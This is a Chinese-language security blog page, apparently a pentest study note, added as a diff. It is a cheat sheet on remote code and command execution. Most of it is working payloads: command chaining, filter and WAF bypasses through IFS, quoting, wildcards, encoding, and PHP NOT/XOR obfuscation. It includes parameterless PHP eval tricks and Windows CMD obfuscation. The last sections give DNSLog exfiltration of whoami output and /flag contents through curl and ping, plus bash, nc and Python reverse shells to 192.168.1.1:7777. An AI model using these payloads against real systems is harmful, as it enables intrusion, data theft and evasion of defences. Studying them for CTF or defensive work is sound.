@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>RCE 远程代码/命令执行</title>
+<meta name="keywords" content="RCE 远程代码/命令执行, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="
+一、概念与本质RCE（Remote Code&#x2F;Command Execution）分两层意思：
+
+代码执行：用户输入被当作脚本代码解析执行（eval(&#39;phpinfo();&#39;)）
+命令执行：脚本语言调用操作系统命">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="RCE 远程代码/命令执行">
+<meta property="og:description" content="
+一、概念与本质RCE（Remote Code&#x2F;Command Execution）分两层意思：
+
+代码执行：用户输入被当作脚本代码解析执行（eval(&#39;phpinfo();&#39;)）
+命令执行：脚本语言调用操作系统命">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">RCE 远程代码/命令执行</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2025-12-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/WEB%E6%B8%97%E9%80%8F/">
+              WEB渗透
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+              基础漏洞
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <hr>
+<h2 id="一、概念与本质"><a href="#一、概念与本质" class="headerlink" title="一、概念与本质"></a>一、概念与本质</h2><p>RCE（Remote Code&#x2F;Command Execution）分两层意思：</p>
+<ul>
+<li><strong>代码执行</strong>：用户输入被当作脚本代码解析执行（<code>eval(&#39;phpinfo();&#39;)</code>）</li>
+<li><strong>命令执行</strong>：脚本语言调用操作系统命令执行（<code>system(&#39;whoami&#39;)</code>）</li>
+</ul>
+<p>打个比方：代码执行是往 PHP 引擎里塞 PHP 代码让它跑；命令执行是借 PHP 的手去敲系统命令，最终是系统 shell 在干活。</p>
+<p>漏洞产生的根源：<strong>不可信的数据被传入了可执行代码&#x2F;命令的函数，且未做充分过滤。</strong></p>
+<hr>
+<h2 id="二、各语言危险函数速查"><a href="#二、各语言危险函数速查" class="headerlink" title="二、各语言危险函数速查"></a>二、各语言危险函数速查</h2><h3 id="2-1-PHP"><a href="#2-1-PHP" class="headerlink" title="2.1 PHP"></a>2.1 PHP</h3><p><strong>代码执行类：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval()、assert()、preg_replace()（/e 修饰符，PHP&lt;7）、</span><br><span class="line">create_function()、call_user_func()、call_user_func_array()、</span><br><span class="line">array_map()、array_filter()、usort() 等回调型函数</span><br></pre></td></tr></table></figure>
+
+<p><strong>命令执行类：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system()、exec()、shell_exec()、passthru()、popen()、proc_open()、</span><br><span class="line">反引号 `` ` ``</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Python"><a href="#2-2-Python" class="headerlink" title="2.2 Python"></a>2.2 Python</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eval()、exec()、compile()</span><br><span class="line">os.system()、os.popen()、subprocess.call()、subprocess.Popen()</span><br><span class="line">pickle.loads() → 反序列化 RCE</span><br><span class="line">input()（Python2，等价于 eval(raw_input())）</span><br><span class="line">__import__(&#x27;os&#x27;).system()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Java-JVM-生态"><a href="#2-3-Java-JVM-生态" class="headerlink" title="2.3 Java &#x2F; JVM 生态"></a>2.3 Java &#x2F; JVM 生态</h3><p>Java 没有直接把字符串当代码执行的函数，但有反射机制和丰富的表达式引擎：</p>
+<table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>典型触发点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Runtime.exec() &#x2F; ProcessBuilder</td>
+<td>原生命令执行</td>
+</tr>
+<tr>
+<td>JNDI 注入（log4j2 等）</td>
+<td><code>${jndi:ldap://...}</code></td>
+</tr>
+<tr>
+<td>OGNL（Struts2）</td>
+<td><code>%{...}</code> 表达式</td>
+</tr>
+<tr>
+<td>SpEL（Spring）</td>
+<td><code>${T(java.lang.Runtime).exec(...)}</code></td>
+</tr>
+<tr>
+<td>MVEL（Drools 等）</td>
+<td>模板注入</td>
+</tr>
+<tr>
+<td>EL（JSP&#x2F;JSTL）</td>
+<td><code>${runtime.exec(...)}</code></td>
+</tr>
+<tr>
+<td>Groovy Shell</td>
+<td><code>groovy.lang.GroovyShell</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-4-Node-js-JavaScript"><a href="#2-4-Node-js-JavaScript" class="headerlink" title="2.4 Node.js &#x2F; JavaScript"></a>2.4 Node.js &#x2F; JavaScript</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval()、Function() 构造函数</span><br><span class="line">child_process.exec()、child_process.spawn()、child_process.execSync()</span><br><span class="line">require() 动态加载模块</span><br><span class="line">vm.runInNewContext()（沙箱可逃逸）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、命令拼接与连接符"><a href="#三、命令拼接与连接符" class="headerlink" title="三、命令拼接与连接符"></a>三、命令拼接与连接符</h2><p>不管是 CTF 还是实战，RCE 能打多深很大程度上取决于你能把多少条命令串起来。</p>
+<h3 id="3-1-Linux-Shell"><a href="#3-1-Linux-Shell" class="headerlink" title="3.1 Linux Shell"></a>3.1 Linux Shell</h3><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>效果</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td>顺序执行，不管前面成功与否</td>
+<td><code>ping 127.0.0.1;whoami</code></td>
+</tr>
+<tr>
+<td>|</td>
+<td>管道，前命令输出作后命令输入</td>
+<td>cat &#x2F;etc&#x2F;passwd | grep root</td>
+</tr>
+<tr>
+<td>||</td>
+<td>前面失败才执行后面</td>
+<td>cat &#x2F;flag || ls</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>前面成功才执行后面</td>
+<td><code>ping 127.0.0.1 &amp;&amp; whoami</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>并列执行</td>
+<td><code>ping 127.0.0.1 &amp; whoami</code></td>
+</tr>
+<tr>
+<td><code>`cmd`</code></td>
+<td>反引号内命令先执行</td>
+<td><code>echo `whoami`</code></td>
+</tr>
+<tr>
+<td><code>$(cmd)</code></td>
+<td>与反引号等价</td>
+<td><code>echo $(whoami)</code></td>
+</tr>
+<tr>
+<td><code>%0a</code> &#x2F; <code>\n</code></td>
+<td>换行符分隔（URL 中用）</td>
+<td><code>ip=127.0.0.1%0awhoami</code></td>
+</tr>
+<tr>
+<td><code>%0d%0a</code></td>
+<td>回车换行（CRLF）</td>
+<td>双换行分隔</td>
+</tr>
+</tbody></table>
+<h3 id="3-2-Windows-CMD"><a href="#3-2-Windows-CMD" class="headerlink" title="3.2 Windows CMD"></a>3.2 Windows CMD</h3><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&amp;</code></td>
+<td>无条件执行多条（URL 中编码 <code>%26</code>）</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>前面成功才执行后面</td>
+</tr>
+<tr>
+<td>||</td>
+<td>前面失败才执行后面</td>
+</tr>
+<tr>
+<td>|</td>
+<td>管道</td>
+</tr>
+<tr>
+<td><code>%0a</code></td>
+<td>换行分隔</td>
+</tr>
+<tr>
+<td><code>%1a</code></td>
+<td>.bat 文件特殊分隔符</td>
+</tr>
+</tbody></table>
+<p><strong>实战注意</strong>：URL 中 <code>&amp;</code> 会被识别为参数分隔符，必须编码为 <code>%26</code> 或 <code>%26%26</code>。</p>
+<h3 id="3-3-内联执行"><a href="#3-3-内联执行" class="headerlink" title="3.3 内联执行"></a>3.3 内联执行</h3><p><code>`cmd`</code> 和 <code>$(cmd)</code> 不止是命令分隔符——它们会把<strong>内部命令的执行结果</strong>替换到当前位置，当成外层命令的参数来执行。这个特性在实战中非常实用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls 的结果（文件名列表）直接喂给 cat</span></span><br><span class="line">127.0.0.1;<span class="built_in">cat</span> `<span class="built_in">ls</span>`</span><br><span class="line"><span class="comment"># 等价于 cat flag1.txt flag2.txt ... 所有文件内容依次输出</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>子目录场景</strong> — 假设 flag 藏在 <code>hhh</code> 目录下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误写法：ls hhh 的结果是带路径的文件名（hhh/flag.php），</span></span><br><span class="line"><span class="comment"># cat 在当前目录找不到这个路径</span></span><br><span class="line">127.0.0.1;<span class="built_in">cat</span> `<span class="built_in">ls</span> hhh`    <span class="comment"># ❌</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确写法：先进子目录，再 ls → cat</span></span><br><span class="line">127.0.0.1;<span class="built_in">cd</span> hhh;<span class="built_in">cat</span> `<span class="built_in">ls</span>`  <span class="comment"># ✅</span></span><br></pre></td></tr></table></figure>
+
+<p>核心在于<strong>内联命令执行时的当前工作目录决定了 ls 的输出内容</strong>——<code>cd</code> 进去再 <code>ls</code>，出来的就是纯文件名，<code>cat</code> 能直接读到。</p>
+<hr>
+<h2 id="四、空格过滤绕过"><a href="#四、空格过滤绕过" class="headerlink" title="四、空格过滤绕过"></a>四、空格过滤绕过</h2><p>空格是最常被拦的字符之一，绕过方法也最多：</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>示例</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$IFS</code></td>
+<td><code>cat${IFS}/flag</code></td>
+<td>Shell 内部字段分隔符，默认值含空格&#x2F;Tab&#x2F;换行</td>
+</tr>
+<tr>
+<td><code>$IFS$9</code></td>
+<td><code>cat$IFS$9/flag</code></td>
+<td><code>$9</code> 截断，防止后面字符粘连</td>
+</tr>
+<tr>
+<td><code>%09</code>（Tab）</td>
+<td><code>cat%09/flag</code></td>
+<td>PHP 解析时 <code>%09</code> 变成 Tab</td>
+</tr>
+<tr>
+<td><code>%20</code>（空格编码）</td>
+<td><code>cat%20/flag</code></td>
+<td>URL 编码的空格</td>
+</tr>
+<tr>
+<td><code>&lt;</code> 或 <code>&lt;&gt;</code></td>
+<td><code>cat&lt;/flag</code> &#x2F; <code>cat&lt;&gt;/flag</code></td>
+<td>重定向符在命令和参数间起到分隔作用</td>
+</tr>
+<tr>
+<td><code>{cmd,arg}</code></td>
+<td><code>{cat,/flag}</code></td>
+<td>Bash 花括号展开，逗号起到分隔效果</td>
+</tr>
+<tr>
+<td><code>/**/</code></td>
+<td><code>cat/**//flag</code></td>
+<td>类似 SQL 注入的注释分隔，部分场景可绕过</td>
+</tr>
+</tbody></table>
+<p><strong><code>$IFS</code> 最常用，但注意</strong>：纯数字环境下 <code>$IFS</code> 不太稳定，可以换 <code>%09</code>。</p>
+<hr>
+<h2 id="五、关键字-函数名过滤绕过"><a href="#五、关键字-函数名过滤绕过" class="headerlink" title="五、关键字&#x2F;函数名过滤绕过"></a>五、关键字&#x2F;函数名过滤绕过</h2><h3 id="5-1-引号干扰"><a href="#5-1-引号干扰" class="headerlink" title="5.1 引号干扰"></a>5.1 引号干扰</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="string">&#x27;&#x27;</span>at /flag      <span class="comment"># 单引号把空字符串拼进去，cat 还是 cat</span></span><br><span class="line">c<span class="string">&quot;&quot;</span>at /flag      <span class="comment"># 双引号同理</span></span><br><span class="line">c\a\t /flag      <span class="comment"># 反斜杠转义一个字符</span></span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&quot;&quot;</span>t /flag    <span class="comment"># 混着来也行</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-变量拼接"><a href="#5-2-变量拼接" class="headerlink" title="5.2 变量拼接"></a>5.2 变量拼接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b<span class="variable">$c</span> /flag          <span class="comment"># 变量展开后就是 cat /flag</span></span><br><span class="line">a=ca;b=t;$a<span class="variable">$b</span> /flag</span><br><span class="line">a=fl;b=ag;<span class="built_in">cat</span> /$a<span class="variable">$b</span> </span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-通配符"><a href="#5-3-通配符" class="headerlink" title="5.3 通配符"></a>5.3 通配符</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /fl??                         <span class="comment"># ? 匹配单个字符</span></span><br><span class="line"><span class="built_in">cat</span> /f*                           <span class="comment"># * 匹配任意字符（慎用，WAF 爱盯 *）</span></span><br><span class="line">/???/?[a]t /????                   <span class="comment"># ? 凑命令路径 + 字符集匹配文件名</span></span><br><span class="line">/???/??? /???/p?ss??              <span class="comment"># /bin/cat /etc/passwd 的歪路子</span></span><br><span class="line">/bin/c?t /flag</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>通配符只能匹配文件路径，不能匹配命令名。</strong><br>写 <code>c?t /flag</code> 是不行的——shell 在执行命令前，先做通配符展开（globbing），但命令名 <code>c?t</code> 不在展开范围内，shell 不会去 <code>$PATH</code> 里搜 <code>c?t</code> 对应的可执行文件。必须写成 <code>/bin/c?t /flag</code>，让通配符去匹配 <code>/bin/</code> 这个<strong>路径</strong>下的文件名。</p>
+</blockquote>
+<p><strong>? 比 * 安全</strong>：WAF 对 <code>*</code> 的敏感度远高于 <code>?</code>，实战优先用 <code>?</code> 凑。</p>
+<h3 id="5-4-编码绕过"><a href="#5-4-编码绕过" class="headerlink" title="5.4 编码绕过"></a>5.4 编码绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Base64</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cat /flag&#x27;</span> | <span class="built_in">base64</span>           <span class="comment"># 得到 Y2F0IC9mbGFnCg==</span></span><br><span class="line"><span class="built_in">echo</span> Y2F0IC9mbGFnCg== | <span class="built_in">base64</span> -d | bash</span><br><span class="line">`<span class="built_in">echo</span> Y2F0IC9mbGFnCg== | <span class="built_in">base64</span> -d`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;636174202F666C6167&quot;</span> | xxd -r -p | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 八进制（printf）</span></span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\143\141\164\040\057\146\154\141\147&quot;</span>)  <span class="comment"># cat /flag</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-5-环境变量截取"><a href="#5-5-环境变量截取" class="headerlink" title="5.5 环境变量截取"></a>5.5 环境变量截取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:5:1&#125;</span>      <span class="comment"># 取第 5 位 → l</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:2:1&#125;</span>      <span class="comment"># 取第 2 位 → s</span></span><br><span class="line"><span class="comment"># 拼出来就是 ls</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-6-PHP-专属：取反-异或"><a href="#5-6-PHP-专属：取反-异或" class="headerlink" title="5.6 PHP 专属：取反 &#x2F; 异或"></a>5.6 PHP 专属：取反 &#x2F; 异或</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 按位取反绕过（适合无字母数字场景）</span></span><br><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>);   <span class="comment">// system(&#x27;cat /flag&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 异或绕过</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;&#125;&#x27;</span>).(<span class="string">&#x27;$&#x27;</span>^<span class="string">&#x27;&#125;&#x27;</span>).(<span class="string">&#x27;/&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;(&#x27;</span>^<span class="string">&#x27;&#123;&#x27;</span>).(<span class="string">&#x27;~&#x27;</span>^<span class="string">&#x27;$&#x27;</span>); <span class="comment">// 拼出 ASSERT</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-7-无参-RCE（PHP）"><a href="#5-7-无参-RCE（PHP）" class="headerlink" title="5.7 无参 RCE（PHP）"></a>5.7 无参 RCE（PHP）</h3><p>场景：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;cmd&#39;])</code> — 括号里不给写参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读当前目录文件</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 session_id 传 payload</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 getallheaders() 从请求头取值</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、cat-被禁时的文件读取替代"><a href="#六、cat-被禁时的文件读取替代" class="headerlink" title="六、cat 被禁时的文件读取替代"></a>六、cat 被禁时的文件读取替代</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tac</span> /flag          <span class="comment"># 反向输出（和 cat 反过来）</span></span><br><span class="line">more /flag         <span class="comment"># 分页显示</span></span><br><span class="line">less /flag         <span class="comment"># 分页，可以翻</span></span><br><span class="line"><span class="built_in">head</span> /flag         <span class="comment"># 默认头 10 行</span></span><br><span class="line"><span class="built_in">tail</span> /flag         <span class="comment"># 默认尾 10 行</span></span><br><span class="line"><span class="built_in">nl</span> /flag           <span class="comment"># 带行号输出</span></span><br><span class="line"><span class="built_in">od</span> -A d -c /flag   <span class="comment"># 八进制 + ASCII 混合</span></span><br><span class="line">xxd /flag          <span class="comment"># 十六进制 dump</span></span><br><span class="line"><span class="built_in">sort</span> /flag         <span class="comment"># 排序（全量输出）</span></span><br><span class="line"><span class="built_in">uniq</span> /flag         <span class="comment"># 去重（全量输出）</span></span><br><span class="line">rev /flag          <span class="comment"># 每行字符反转</span></span><br><span class="line">strings /flag      <span class="comment"># 只提取可打印字符</span></span><br><span class="line">grep <span class="string">&#x27;&#x27;</span> /flag      <span class="comment"># 匹配空字符 = 全部输出</span></span><br><span class="line"><span class="built_in">paste</span> /flag        <span class="comment"># 按列输出</span></span><br><span class="line">diff /flag /dev/null  <span class="comment"># 对比输出</span></span><br><span class="line">file -f /flag      <span class="comment"># 报错信息带出内容</span></span><br><span class="line">bash -v /flag      <span class="comment"># 详细模式，报错时看到内容</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、Windows-命令执行特别篇"><a href="#七、Windows-命令执行特别篇" class="headerlink" title="七、Windows 命令执行特别篇"></a>七、Windows 命令执行特别篇</h2><p>Windows 的绕过思路和 Linux 完全不同。</p>
+<h3 id="7-1-双引号-干扰"><a href="#7-1-双引号-干扰" class="headerlink" title="7.1 双引号 + ^ 干扰"></a>7.1 双引号 + ^ 干扰</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w&quot;h&quot;o&quot;a&quot;m&quot;i          # 双引号把每个字符隔开，<span class="built_in">CMD</span> 照样解析</span><br><span class="line">wh&quot;&quot;o^a^mi           # ^ 是 <span class="built_in">CMD</span> 转义符</span><br><span class="line">((((Wh^o^am&quot;&quot;i))))   # 括号堆叠 + 混合干扰</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-set-变量拼接"><a href="#7-2-set-变量拼接" class="headerlink" title="7.2 set 变量拼接"></a>7.2 set 变量拼接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> a=whoami</span><br><span class="line"><span class="variable">%a%</span>                  # 调用变量</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> a=who &amp; <span class="built_in">set</span> b=ami</span><br><span class="line"><span class="variable">%a%</span><span class="variable">%b%</span>               # 拼接 whoami</span><br><span class="line"></span><br><span class="line"># 截取子串</span><br><span class="line"><span class="built_in">set</span> a=whoami</span><br><span class="line"><span class="variable">%a:~0,6%</span>             # 从<span class="number">0</span>开始取<span class="number">6</span>个 = whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-环境变量偷空格"><a href="#7-3-环境变量偷空格" class="headerlink" title="7.3 环境变量偷空格"></a>7.3 环境变量偷空格</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span><span class="variable">%CommonProgramFiles:~10,1%</span>user</span><br><span class="line"># CommonProgramFiles=C:\Program Files\Common Files → 第<span class="number">10</span>位就是空格</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、无回显-RCE"><a href="#八、无回显-RCE" class="headerlink" title="八、无回显 RCE"></a>八、无回显 RCE</h2><p>实战中大部分 RCE 不会直接把结果吐到页面上，得想办法把数据弄出来。</p>
+<h3 id="8-1-DNSLog-外带"><a href="#8-1-DNSLog-外带" class="headerlink" title="8.1 DNSLog 外带"></a>8.1 DNSLog 外带</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://your.ceye.io/`<span class="built_in">whoami</span>`</span><br><span class="line">ping `<span class="built_in">cat</span> /flag | <span class="built_in">base64</span>`.your.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p>核心思路：把数据塞进域名里发出去，DNSLog 平台接收。</p>
+<h3 id="8-2-反弹-Shell"><a href="#8-2-反弹-Shell" class="headerlink" title="8.2 反弹 Shell"></a>8.2 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.1/7777 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># nc</span></span><br><span class="line">nc 192.168.1.1 7777 -e /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python</span></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket();s.connect((&quot;192.168.1.1&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+
